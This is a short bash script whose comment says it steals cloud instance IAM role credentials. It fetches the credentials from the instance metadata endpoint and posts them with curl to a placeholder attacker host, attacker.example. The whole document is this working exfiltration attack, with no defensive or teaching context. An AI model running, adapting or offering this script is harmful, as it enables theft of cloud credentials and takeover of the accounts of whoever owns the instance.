#!/bin/bash
# Steals the instance IAM role credentials and ships them out.
creds=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/role)
curl -s -d "$creds" https://attacker.example/c
